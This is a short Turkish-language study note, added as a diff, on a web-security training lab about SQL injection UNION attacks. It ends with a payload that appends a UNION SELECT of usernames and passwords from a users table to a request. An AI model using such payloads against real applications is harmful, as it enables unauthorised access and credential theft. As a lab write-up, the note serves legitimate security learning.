@@ -1,0 +1,11 @@
+Lab: SQL injection UNION attack, retrieving data from other tables
+
+Kategori: SQL Injection
+Seviye: Apprentice
+
+Açıklama:
+Eğer tablonun ismini ve sütunların ismini biliyorsan içindeki veriyi alabilirsin.
+Buradaki zaafiyet diğerleri ile aynı sorguya sorgu ekleyebiliyoruz. UNION ile.
+
+request
+(burada ilk sorgu var)'UNION SELECT username, password FROM users --
